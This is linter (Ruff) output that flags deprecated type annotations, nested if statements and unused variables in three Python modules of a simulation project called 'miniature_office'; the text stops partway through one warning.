   --> src\app\miniature_office\core\code_civilization.py:284:31
    |
282 |     detected_patterns: Optional[List[Dict]] = None  # All patterns found
283 |     dependency_graph: Optional[Dict] = None  # Complete dependency structure
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
    |                               ^^^^
285 |
286 |     def to_dict(self) -> Dict:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:286:26
    |
284 |     design_analysis: Optional[Dict] = None  # MAXIMUM ALLOWED DESIGN analysis
285 |
286 |     def to_dict(self) -> Dict:
    |                          ^^^^
287 |         result = {
288 |             "invariants": self.invariants,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:323:21
    |
322 |     code: str
323 |     files_modified: List[str] = field(default_factory=list)
    |                     ^^^^
324 |
325 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:325:26
    |
323 |     files_modified: List[str] = field(default_factory=list)
324 |
325 |     def to_dict(self) -> Dict:
    |                          ^^^^
326 |         return {"code": self.code, "files_modified": self.files_modified}
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:343:17
    |
342 |     approved: bool
343 |     violations: List[str] = field(default_factory=list)
    |                 ^^^^
344 |     recommendations: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:344:22
    |
342 |     approved: bool
343 |     violations: List[str] = field(default_factory=list)
344 |     recommendations: List[str] = field(default_factory=list)
    |                      ^^^^
345 |
346 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:346:26
    |
344 |     recommendations: List[str] = field(default_factory=list)
345 |
346 |     def to_dict(self) -> Dict:
    |                          ^^^^
347 |         return {
348 |             "approved": self.approved,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:371:26
    |
369 |     all_pass: bool
370 |
371 |     def to_dict(self) -> Dict:
    |                          ^^^^
372 |         return {
373 |             "test_code": self.test_code,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:409:26
    |
407 |             self.sealed = True
408 |
409 |     def to_dict(self) -> Dict:
    |                          ^^^^
410 |         return {
411 |             "contract_satisfied": self.contract_satisfied,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:433:17
    |
431 |     final_code: str
432 |     test_suite: TestSuite
433 |     change_log: List[str]
    |                 ^^^^
434 |     manager_seal: ManagerSeal
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:471:26
    |
469 |         return False
470 |
471 |     def to_dict(self) -> Dict:
    |                          ^^^^
472 |         return {
473 |             "directive_id": self.directive_id,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:525:22
    |
523 |     def __init__(self):
524 |         self.purpose = PurposeConstitution()
525 |         self.floors: Dict[ProgrammingLanguage, LanguageFloor] = {}
    |                      ^^^^
526 |         self.active_directives: Dict[str, CodeDirective] = {}
527 |         self.outputs: Dict[str, CodeOutput] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:526:33
    |
524 |         self.purpose = PurposeConstitution()
525 |         self.floors: Dict[ProgrammingLanguage, LanguageFloor] = {}
526 |         self.active_directives: Dict[str, CodeDirective] = {}
    |                                 ^^^^
527 |         self.outputs: Dict[str, CodeOutput] = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\code_civilization.py:527:23
    |
525 |         self.floors: Dict[ProgrammingLanguage, LanguageFloor] = {}
526 |         self.active_directives: Dict[str, CodeDirective] = {}
527 |         self.outputs: Dict[str, CodeOutput] = {}
    |                       ^^^^
528 |
529 |         # Initialize language floors
    |
help: Replace with `dict`

F841 Local variable `design_result` is assigned to but never used
   --> src\app\miniature_office\core\code_civilization.py:791:21
    |
789 |                 design_analyzer = DesignAnalyzer()
790 |                 try:
791 |                     design_result = design_analyzer.analyze(
    |                     ^^^^^^^^^^^^^
792 |                         ast_root, directive.source
793 |                     )  # noqa: F841
    |
help: Remove assignment to unused variable `design_result`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\code_civilization.py:832:9
    |
831 |           # Check for impossible requirements
832 | /         if "no external dependencies" in [c.lower() for c in directive.constraints]:
833 | |             if (
834 | |                 "use numpy" in directive.source.lower()
835 | |                 or "import numpy" in directive.source.lower()
836 | |             ):
    | |______________^
837 |                   return ArchitecturalDecision(
838 |                       invariants=[],
    |
help: Combine `if` statements using `and`

F541 [*] f-string without any placeholders
   --> src\app\miniature_office\core\code_civilization.py:973:17
    |
971 |             code_lines.append("        # Proper error handling")
972 |             code_lines.append(
973 |                 f'        raise RuntimeError(f"Processing failed: {{e}}")'
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
974 |             )  # noqa: F541
    |
help: Remove extraneous `f` prefix

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\code_civilization.py:1087:54
     |
1085 |         return "\n".join(code_lines)
1086 |
1087 |     def _extract_function_name(self, source: str) -> Optional[str]:
     |                                                      ^^^^^^^^^^^^^
1088 |         """Extract function name from source code"""
1089 |         import re
     |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\miniature_office\core\code_civilization.py:1097:13
     |
1095 |           words = source.lower().split()
1096 |           for i, word in enumerate(words):
1097 | /             if word in ["function", "method", "def"]:
1098 | |                 if i + 1 < len(words):
     | |______________________________________^
1099 |                       return words[i + 1].strip(",:.")
1100 |           return None
     |
help: Combine `if` statements using `and`

UP045 [*] Use `X | None` for type annotations
    --> src\app\miniature_office\core\code_civilization.py:1102:51
     |
1100 |         return None
1101 |
1102 |     def _extract_class_name(self, source: str) -> Optional[str]:
     |                                                   ^^^^^^^^^^^^^
1103 |         """Extract class name from source code"""
1104 |         import re
     |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\miniature_office\core\code_civilization.py:1138:9
     |
1137 |           # Check for proper error handling
1138 | /         if "raise" not in code and "except" not in code and "Error" not in code:
1139 | |             if len(code.split("\n")) > 5:  # Only for non-trivial code
     | |_________________________________________^
1140 |                   recommendations.append("Consider adding error handling")
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\miniature_office\core\code_civilization.py:1143:9
     |
1142 |           # Check for documentation
1143 | /         if '"""' not in code and "'''" not in code and "/**" not in code:
1144 | |             if "def " in code or "function " in code or "class " in code:
     | |_________________________________________________________________________^
1145 |                   violations.append("Missing docstrings/documentation")
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\miniature_office\core\code_civilization.py:1148:9
     |
1147 |           # Check for input validation
1148 | /         if ("def " in code or "function " in code) and "if" not in code:
1149 | |             if len(code.split("\n")) > 3:
     | |_________________________________________^
1150 |                   recommendations.append("Consider adding input validation")
     |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> src\app\miniature_office\core\code_civilization.py:1155:13
     |
1153 |           if any(fname.endswith(".py") for fname in impl.files_modified):
1154 |               # Python-specific checks
1155 | /             if "def " in code:
1156 | |                 # Check for type hints in Python
1157 | |                 if "->" not in code and ":" not in code.split("def")[1].split(")")[0]:
     | |______________________________________________________________________________________^
1158 |                       recommendations.append("Consider adding type hints")
     |
help: Combine `if` statements using `and`

F541 [*] f-string without any placeholders
    --> src\app\miniature_office\core\code_civilization.py:1288:21
     |
1286 |                 test_code_lines.append(f"describe('{func_name}', () => {{")
1287 |                 test_code_lines.append(
1288 |                     f"  it('should work with valid input', () => {{"
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1289 |                 )  # noqa: F541
1290 |                 test_code_lines.append(f"    const result = {func_name}('test');")
     |
help: Remove extraneous `f` prefix

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\cognitive_contract.py:12:1
   |
10 | from datetime import datetime, timezone
11 | from enum import Enum
12 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
13 |
14 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\cognitive_contract.py:12:1
   |
10 | from datetime import datetime, timezone
11 | from enum import Enum
12 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
13 |
14 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:55:18
   |
54 |     goal: str
55 |     constraints: List[str] = field(default_factory=list)
   |                  ^^^^
56 |     non_goals: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:56:16
   |
54 |     goal: str
55 |     constraints: List[str] = field(default_factory=list)
56 |     non_goals: List[str] = field(default_factory=list)
   |                ^^^^
57 |
58 |     def to_dict(self) -> Dict:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:58:26
   |
56 |     non_goals: List[str] = field(default_factory=list)
57 |
58 |     def to_dict(self) -> Dict:
   |                          ^^^^
59 |         return {
60 |             "goal": self.goal,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:73:18
   |
71 |     """
72 |
73 |     assumptions: List[str] = field(default_factory=list)
   |                  ^^^^
74 |     tradeoffs: List[str] = field(default_factory=list)
75 |     alternatives_rejected: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:74:16
   |
73 |     assumptions: List[str] = field(default_factory=list)
74 |     tradeoffs: List[str] = field(default_factory=list)
   |                ^^^^
75 |     alternatives_rejected: List[str] = field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:75:28
   |
73 |     assumptions: List[str] = field(default_factory=list)
74 |     tradeoffs: List[str] = field(default_factory=list)
75 |     alternatives_rejected: List[str] = field(default_factory=list)
   |                            ^^^^
76 |
77 |     def to_dict(self) -> Dict:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:77:26
   |
75 |     alternatives_rejected: List[str] = field(default_factory=list)
76 |
77 |     def to_dict(self) -> Dict:
   |                          ^^^^
78 |         return {
79 |             "assumptions": self.assumptions,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:92:18
   |
90 |     """
91 |
92 |     departments: List[str] = field(default_factory=list)  # Department IDs
   |                  ^^^^
93 |     managers: List[str] = field(default_factory=list)  # Manager IDs
94 |     agents: List[str] = field(default_factory=list)  # Agent IDs
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:93:15
   |
92 |     departments: List[str] = field(default_factory=list)  # Department IDs
93 |     managers: List[str] = field(default_factory=list)  # Manager IDs
   |               ^^^^
94 |     agents: List[str] = field(default_factory=list)  # Agent IDs
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:94:13
   |
92 |     departments: List[str] = field(default_factory=list)  # Department IDs
93 |     managers: List[str] = field(default_factory=list)  # Manager IDs
94 |     agents: List[str] = field(default_factory=list)  # Agent IDs
   |             ^^^^
95 |
96 |     def to_dict(self) -> Dict:
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\cognitive_contract.py:96:26
   |
94 |     agents: List[str] = field(default_factory=list)  # Agent IDs
95 |
96 |     def to_dict(self) -> Dict:
   |                          ^^^^
97 |         return {
98 |             "departments": self.departments,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:109:20
    |
108 |     severity: Severity
109 |     failure_modes: List[str] = field(default_factory=list)
    |                    ^^^^
110 |
111 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:111:26
    |
109 |     failure_modes: List[str] = field(default_factory=list)
110 |
111 |     def to_dict(self) -> Dict:
    |                          ^^^^
112 |         return {"severity": self.severity.value, "failure_modes": self.failure_modes}
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:123:15
    |
121 |     contract_id: str = ""
122 |     reason: str = ""
123 |     evidence: List[str] = field(default_factory=list)
    |               ^^^^
124 |     submitted_at_tick: int = 0
125 |     status: str = "pending"  # pending, accepted, rejected
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:127:26
    |
125 |     status: str = "pending"  # pending, accepted, rejected
126 |
127 |     def to_dict(self) -> Dict:
    |                          ^^^^
128 |         return {
129 |             "challenge_id": self.challenge_id,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:145:21
    |
143 |     reason: str
144 |     impact_analysis: str
145 |     affected_tasks: List[str] = field(default_factory=list)
    |                     ^^^^
146 |     meta_office_approval: bool = False
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:148:26
    |
146 |     meta_office_approval: bool = False
147 |
148 |     def to_dict(self) -> Dict:
    |                          ^^^^
149 |         return {
150 |             "reason": self.reason,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:187:35
    |
185 |         self.stakeholders = Stakeholders()
186 |         self.risk_profile = RiskProfile(severity=Severity.LOW)
187 |         self.acceptance_criteria: List[str] = []
    |                                   ^^^^
188 |         self.binding_level = binding_level
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:192:30
    |
190 |         # Lifecycle
191 |         self.status = ContractStatus.DRAFT
192 |         self.status_history: List[Dict] = []
    |                              ^^^^
193 |         self.ratified_at_tick: Optional[int] = None
194 |         self.fulfilled_at_tick: Optional[int] = None
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:192:35
    |
190 |         # Lifecycle
191 |         self.status = ContractStatus.DRAFT
192 |         self.status_history: List[Dict] = []
    |                                   ^^^^
193 |         self.ratified_at_tick: Optional[int] = None
194 |         self.fulfilled_at_tick: Optional[int] = None
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\cognitive_contract.py:193:32
    |
191 |         self.status = ContractStatus.DRAFT
192 |         self.status_history: List[Dict] = []
193 |         self.ratified_at_tick: Optional[int] = None
    |                                ^^^^^^^^^^^^^
194 |         self.fulfilled_at_tick: Optional[int] = None
195 |         self.superseded_by: Optional[str] = None  # Contract ID
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\cognitive_contract.py:194:33
    |
192 |         self.status_history: List[Dict] = []
193 |         self.ratified_at_tick: Optional[int] = None
194 |         self.fulfilled_at_tick: Optional[int] = None
    |                                 ^^^^^^^^^^^^^
195 |         self.superseded_by: Optional[str] = None  # Contract ID
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\cognitive_contract.py:195:29
    |
193 |         self.ratified_at_tick: Optional[int] = None
194 |         self.fulfilled_at_tick: Optional[int] = None
195 |         self.superseded_by: Optional[str] = None  # Contract ID
    |                             ^^^^^^^^^^^^^
196 |
197 |         # Challenges and revocation
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:198:26
    |
197 |         # Challenges and revocation
198 |         self.challenges: List[ContractChallenge] = []
    |                          ^^^^
199 |         self.revocation_justification: Optional[RevocationJustification] = None
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\cognitive_contract.py:199:40
    |
197 |         # Challenges and revocation
198 |         self.challenges: List[ContractChallenge] = []
199 |         self.revocation_justification: Optional[RevocationJustification] = None
    |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
200 |
201 |         # Child tasks bound to this contract
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:202:27
    |
201 |         # Child tasks bound to this contract
202 |         self.bound_tasks: List[str] = []
    |                           ^^^^
203 |
204 |         # Register
    |
help: Replace with `list`

UP017 [*] Use `datetime.UTC` alias
   --> src\app\miniature_office\core\cognitive_contract.py:252:43
    |
250 |                 "to": new_status.value,
251 |                 "reason": reason,
252 |                 "timestamp": datetime.now(timezone.utc).isoformat(),
    |                                           ^^^^^^^^^^^^
253 |             }
254 |         )
    |
help: Convert to `datetime.UTC` alias

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\miniature_office\core\cognitive_contract.py:286:9
    |
284 |               if entity_id not in self.stakeholders.managers:
285 |                   self.stakeholders.managers.append(entity_id)
286 | /         elif entity_type == "agent":
287 | |             if entity_id not in self.stakeholders.agents:
    | |_________________________________________________________^
288 |                   self.stakeholders.agents.append(entity_id)
    |
help: Combine `if` statements using `and`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:305:58
    |
304 |     def challenge(
305 |         self, challenger_id: str, reason: str, evidence: List[str]
    |                                                          ^^^^
306 |     ) -> ContractChallenge:
307 |         """
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:411:26
    |
409 |         ]
410 |
411 |     def to_dict(self) -> Dict:
    |                          ^^^^
412 |         """Serialize to canonical format"""
413 |         base = super().to_dict()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:440:25
    |
439 |     def __init__(self):
440 |         self.contracts: Dict[str, CognitiveContract] = {}
    |                         ^^^^
441 |         self.challenges_pending: List[ContractChallenge] = []
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:441:34
    |
439 |     def __init__(self):
440 |         self.contracts: Dict[str, CognitiveContract] = {}
441 |         self.challenges_pending: List[ContractChallenge] = []
    |                                  ^^^^
442 |
443 |     def register_contract(self, contract: CognitiveContract):
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\cognitive_contract.py:447:49
    |
445 |         self.contracts[contract.entity_id] = contract
446 |
447 |     def get_contract(self, contract_id: str) -> Optional[CognitiveContract]:
    |                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^
448 |         """Get a contract by ID"""
449 |         return self.contracts.get(contract_id)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:453:10
    |
451 |     def get_contracts_by_status(
452 |         self, status: ContractStatus
453 |     ) -> List[CognitiveContract]:
    |          ^^^^
454 |         """Get all contracts with a specific status"""
455 |         return [c for c in self.contracts.values() if c.status == status]
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:457:39
    |
455 |         return [c for c in self.contracts.values() if c.status == status]
456 |
457 |     def get_active_contracts(self) -> List[CognitiveContract]:
    |                                       ^^^^
458 |         """Get all active contracts"""
459 |         return self.get_contracts_by_status(ContractStatus.ACTIVE)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\cognitive_contract.py:475:41
    |
473 |         self.challenges_pending.append(challenge)
474 |
475 |     def get_pending_challenges(self) -> List[ContractChallenge]:
    |                                         ^^^^
476 |         """Get all pending challenges"""
477 |         return [c for c in self.challenges_pending if c.status == "pending"]
    |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\core\consigliere.py:32:1
   |
30 | from dataclasses import dataclass, field
31 | from enum import Enum
32 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\core\consigliere.py:32:1
   |
30 | from dataclasses import dataclass, field
31 | from enum import Enum
32 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\consigliere.py:62:14
   |
60 |     question: str
61 |     answer: str
62 |     context: Dict[str, Any] = field(default_factory=dict)
   |              ^^^^
63 |     references: List[str] = field(
64 |         default_factory=list
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\core\consigliere.py:63:17
   |
61 |     answer: str
62 |     context: Dict[str, Any] = field(default_factory=dict)
63 |     references: List[str] = field(
   |                 ^^^^
64 |         default_factory=list
65 |     )  # Links to contracts, decisions, etc.
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\consigliere.py:67:26
   |
65 |     )  # Links to contracts, decisions, etc.
66 |
67 |     def to_dict(self) -> Dict:
   |                          ^^^^
68 |         return {
69 |             "type": self.explanation_type.value,
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\consigliere.py:84:15
   |
82 |     original: str
83 |     translated: str
84 |     glossary: Dict[str, str] = field(default_factory=dict)
   |               ^^^^
85 |
86 |     def to_dict(self) -> Dict:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\core\consigliere.py:86:26
   |
84 |     glossary: Dict[str, str] = field(default_factory=dict)
85 |
86 |     def to_dict(self) -> Dict:
   |                          ^^^^
87 |         return {
88 |             "type": self.translation_type.value,
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:100:19
    |
 99 |     action: str
100 |     consequences: List[str] = field(default_factory=list)
    |                   ^^^^
101 |     resource_costs: Dict[str, int] = field(default_factory=dict)
102 |     risks: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:101:21
    |
 99 |     action: str
100 |     consequences: List[str] = field(default_factory=list)
101 |     resource_costs: Dict[str, int] = field(default_factory=dict)
    |                     ^^^^
102 |     risks: List[str] = field(default_factory=list)
103 |     alternatives: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:102:12
    |
100 |     consequences: List[str] = field(default_factory=list)
101 |     resource_costs: Dict[str, int] = field(default_factory=dict)
102 |     risks: List[str] = field(default_factory=list)
    |            ^^^^
103 |     alternatives: List[str] = field(default_factory=list)
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:103:19
    |
101 |     resource_costs: Dict[str, int] = field(default_factory=dict)
102 |     risks: List[str] = field(default_factory=list)
103 |     alternatives: List[str] = field(default_factory=list)
    |                   ^^^^
104 |
105 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:105:26
    |
103 |     alternatives: List[str] = field(default_factory=list)
104 |
105 |     def to_dict(self) -> Dict:
    |                          ^^^^
106 |         return {
107 |             "action": self.action,
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:122:21
    |
120 |     rationale: str
121 |     expected_outcome: str
122 |     estimated_cost: Dict[str, int] = field(default_factory=dict)
    |                     ^^^^
123 |     warnings: List[str] = field(default_factory=list)
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:123:15
    |
121 |     expected_outcome: str
122 |     estimated_cost: Dict[str, int] = field(default_factory=dict)
123 |     warnings: List[str] = field(default_factory=list)
    |               ^^^^
124 |
125 |     def to_dict(self) -> Dict:
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:125:26
    |
123 |     warnings: List[str] = field(default_factory=list)
124 |
125 |     def to_dict(self) -> Dict:
    |                          ^^^^
126 |         return {
127 |             "draft_text": self.draft_text,
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:152:35
    |
151 |     def __init__(self):
152 |         self.explanation_history: List[Explanation] = []
    |                                   ^^^^
153 |         self.translation_history: List[Translation] = []
154 |         self.preview_history: List[Preview] = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:153:35
    |
151 |     def __init__(self):
152 |         self.explanation_history: List[Explanation] = []
153 |         self.translation_history: List[Translation] = []
    |                                   ^^^^
154 |         self.preview_history: List[Preview] = []
155 |         self.draft_history: List[DraftDirective] = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:154:31
    |
152 |         self.explanation_history: List[Explanation] = []
153 |         self.translation_history: List[Translation] = []
154 |         self.preview_history: List[Preview] = []
    |                               ^^^^
155 |         self.draft_history: List[DraftDirective] = []
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:155:29
    |
153 |         self.translation_history: List[Translation] = []
154 |         self.preview_history: List[Preview] = []
155 |         self.draft_history: List[DraftDirective] = []
    |                             ^^^^
156 |
157 |     # =========================================================================
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:167:10
    |
165 |         priority: str = "normal",
166 |         issued_by_human: bool = True,
167 |     ) -> Dict:
    |          ^^^^
168 |         """
169 |         Issue directive to a manager.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:217:10
    |
215 |         justification: str,
216 |         issued_by_human: bool = True,
217 |     ) -> Dict:
    |          ^^^^
218 |         """
219 |         Update an agent's directive.
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:259:26
    |
258 |     def coordinate_cross_floor_work(
259 |         self, floor_ids: List[str], coordination_plan: str, issued_by_human: bool = True
    |                          ^^^^
260 |     ) -> Dict:
261 |         """
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:260:10
    |
258 |     def coordinate_cross_floor_work(
259 |         self, floor_ids: List[str], coordination_plan: str, issued_by_human: bool = True
260 |     ) -> Dict:
    |          ^^^^
261 |         """
262 |         Coordinate work across multiple floors.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\core\consigliere.py:295:56
    |
294 |     def tell_human_impossible(
295 |         self, request: str, reason: str, alternatives: Optional[List[str]] = None
    |                                                        ^^^^^^^^^^^^^^^^^^^
296 |     ) -> Dict:
297 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\miniature_office\core\consigliere.py:295:65
    |
294 |     def tell_human_impossible(
295 |         self, request: str, reason: str, alternatives: Optional[List[str]] = None
    |                                                                 ^^^^
296 |     ) -> Dict:
297 |         """
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:296:10
    |
294 |     def tell_human_impossible(
295 |         self, request: str, reason: str, alternatives: Optional[List[str]] = None
296 |     ) -> Dict:
    |          ^^^^
297 |         """
298 |         Tell the human that something is impossible.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:313:65
    |
312 |     def tell_human_feasible(
313 |         self, request: str, approach: str, estimated_resources: Dict[str, int]
    |                                                                 ^^^^
314 |     ) -> Dict:
315 |         """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\core\consigliere.py:314:10
    |
